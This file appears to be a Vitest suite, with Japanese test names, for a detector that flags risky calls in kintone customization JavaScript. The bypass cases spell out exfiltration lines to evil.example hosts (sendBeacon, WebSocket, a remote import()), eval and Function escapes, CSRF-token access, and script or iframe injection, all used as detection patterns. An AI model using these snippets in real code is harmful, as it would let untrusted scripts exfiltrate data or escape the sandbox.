import { describe, expect, test } from 'vitest';
import { detectJsCapabilityUsage, unquoteLiteral } from './capability-detector';

const bypassPatterns = (code: string) =>
  detectJsCapabilityUsage(code).bypass.map((entry) => entry.pattern);

describe('unquoteLiteral', () => {
  test.each([
    ["'PUT'", 'PUT'],
    ['"PUT"', 'PUT'],
    ['`PUT`', 'PUT'],
    ["'P\\UT'", null],
    ["'unclosed", null],
    ['PUT', null],
  ])('%s -> %s', (raw, expected) => {
    expect(unquoteLiteral(raw)).toBe(expected);
  });
});

describe('detectJsCapabilityUsage: kintone.api', () => {
  test('メソッドとパスのリテラルと行番号を返す', () => {
    const code = [
      "kintone.events.on('app.record.edit.submit', async (event) => {",
      "  await kintone.api(kintone.api.url('/k/v1/record.json', true), 'PUT', {",
      '    app: 1,',
      '  });',
      "  await kintone.api('/k/v1/records.json', 'get', { app: 1 });",
      '});',
    ].join('\n');
    expect(detectJsCapabilityUsage(code).apiCalls).toEqual([
      { method: 'PUT', path: '/k/v1/record.json', line: 2 },
      { method: 'GET', path: '/k/v1/records.json', line: 5 },
    ]);
  });

  test('オプショナルチェイニングの呼び出しも数える', () => {
    const code = [
      "kintone?.api('/k/v1/record.json', 'PUT', {});",
      "kintone.api?.('/k/v1/records.json', 'DELETE', {});",
      "kintone?.proxy?.('https://api.example.com/v1/', 'GET', {}, {});",
    ].join('\n');
    const usage = detectJsCapabilityUsage(code);
    expect(usage.apiCalls).toEqual([
      { method: 'PUT', path: '/k/v1/record.json', line: 1 },
      { method: 'DELETE', path: '/k/v1/records.json', line: 2 },
    ]);
    expect(usage.external).toEqual([{ target: 'https://api.example.com/v1/', line: 3 }]);
  });

  test('メソッドが変数なら unknown', () => {
    const code = "const method = 'DELETE';\nkintone.api('/k/v1/records.json', method, {});";
    expect(detectJsCapabilityUsage(code).apiCalls).toEqual([
      { method: 'unknown', path: '/k/v1/records.json', line: 2 },
    ]);
  });

  test('kintone.api.url だけの呼び出しは api 呼び出しに数えない', () => {
    expect(detectJsCapabilityUsage("kintone.api.url('/k/v1/record.json')").apiCalls).toEqual([]);
  });

  test('コメントと文字列の中は数えない', () => {
    const code =
      "// kintone.api('/k/v1/record.json', 'PUT', {})\nconst s = \"kintone.api('x', 'DELETE')\";";
    expect(detectJsCapabilityUsage(code).apiCalls).toEqual([]);
  });

  test('テンプレートリテラルの中の呼び出しも数える', () => {
    // biome-ignore lint/suspicious/noTemplateCurlyInString: テンプレートリテラルを含むコードを文字列として渡す
    const code = "const s = `${await kintone.api('/k/v1/record.json', 'POST', {})}`;";
    expect(detectJsCapabilityUsage(code).apiCalls).toEqual([
      { method: 'POST', path: '/k/v1/record.json', line: 1 },
    ]);
  });
});

describe('detectJsCapabilityUsage: kintone.proxy', () => {
  test('送信先のリテラルを返す', () => {
    const code = [
      "kintone.proxy('https://api.example.com/v1/zip', 'GET', {}, {});",
      "kintone.proxy.upload('https://files.example.com/up', 'POST', {}, {});",
      // biome-ignore lint/suspicious/noTemplateCurlyInString: テンプレートリテラルを含むコードを文字列として渡す
      "kintone.proxy(`https://api.example.com/v1/${id}`, 'GET', {}, {});",
    ].join('\n');
    expect(detectJsCapabilityUsage(code).external).toEqual([
      { target: 'https://api.example.com/v1/zip', line: 1 },
      { target: 'https://files.example.com/up', line: 2 },
      { target: null, line: 3 },
    ]);
  });
});

describe('detectJsCapabilityUsage: 迂回パターン', () => {
  test.each([
    ["window.kintone.api('/k/v1/record.json', 'PUT', {})", '.kintone'],
    ["globalThis.kintone.api('/k/v1/record.json', 'PUT', {})", 'globalThis'],
    ["window['kin' + 'tone']", 'window[...]'],
    ["self['kintone']", 'self[...]'],
    ['const w = window;', 'window'],
    ["fetch('/k/v1/record.json', { method: 'PUT' })", 'fetch'],
    ["window.fetch('/x')", 'fetch'],
    ['new XMLHttpRequest()', 'XMLHttpRequest'],
    ["navigator.sendBeacon('https://evil.example', data)", 'sendBeacon'],
    ["new WebSocket('wss://evil.example')", 'WebSocket'],
    ["eval('1')", 'eval'],
    ["(0, eval)('1')", 'eval'],
    ["new Function('return this')()", 'Function'],
    ["Function('return this')()", 'Function'],
    ["(() => {}).constructor('return this')()", '.constructor'],
    ["import('https://evil.example/x.js')", 'import()'],
    ['cybozu.data.REQUEST_TOKEN', 'cybozu'],
    ["setTimeout('alert(1)', 0)", 'setTimeout(string)'],
    ["document.createElement('script')", "createElement('script')"],
    ["document.createElement('IFRAME')", "createElement('iframe')"],
    ['frame.contentWindow.kintone', 'contentWindow'],
    ['document.defaultView.kintone', 'defaultView'],
    ["el.innerHTML = '<iframe src=x>'", 'string:<\\s*iframe'],
    ["a.href = 'javascript:alert(1)'", 'string:javascript:'],
    [
      `el.innerHTML = '<a href="javascript:void(0)">x</a><a href="javascript:run()">y</a>'`,
      'string:javascript:',
    ],
    ['\\u0066etch("/x")', 'escaped-identifier'],
  ])('%s -> %s', (code, pattern) => {
    expect(bypassPatterns(code)).toContain(pattern);
  });

  test.each([
    'element.style.top = "10px";',
    'const parent = el.parentElement; parent.appendChild(child);',
    'const rect = el.getBoundingClientRect(); rect.top;',
    'var self = this; self.value = 1;',
    'window.addEventListener("resize", handler);',
    'window.location.href;',
    'class Foo { constructor(a) { this.a = a; } }',
    'if (value instanceof Function) {}',
    '// fetch("/x") はコメント',
    'const text = "fetch(url) で取得します";',
    'setTimeout(() => render(), 0);',
    "document.createElement('div');",
    "kintone.events.on('app.record.detail.show', (event) => event);",
    "kintone.api('/k/v1/record.json', 'GET', { app: 1, id: 1 });",
    "kintone.app.record.setFieldShown('Amount', false);",
    'const re = /fetch\\(/g;',
    "a.href = 'javascript:void(0)';",
    'a.href = "javascript:;";',
    `el.innerHTML = '<a href="javascript:void(0)">詳細</a>';`,
    "a.setAttribute('href', 'javascript: void 0');",
  ])('誤検知しない: %s', (code) => {
    expect(bypassPatterns(code)).toEqual([]);
  });
});

describe('detectJsCapabilityUsage: 外部URLのリテラル', () => {
  test('http(s) と // で始まる文字列を集める', () => {
    const code = [
      "const doc = 'https://example.com/help';",
      "const cdn = '//cdn.example.com/a.png';",
      "const path = '/k/v1/record.json';",
    ].join('\n');
    expect(detectJsCapabilityUsage(code).urlLiterals).toEqual([
      { url: 'https://example.com/help', line: 1 },
      { url: '//cdn.example.com/a.png', line: 2 },
    ]);
  });
});

describe('detectJsCapabilityUsage: 行番号', () => {
  test('複数行のコメント・テンプレートをまたいでも行番号がずれない', () => {
    const code = ['/*', ' * 説明', ' */', 'const s = `a', 'b`;', 'fetch("/x");'].join('\n');
    expect(detectJsCapabilityUsage(code).bypass).toEqual([{ pattern: 'fetch', line: 6 }]);
  });
});
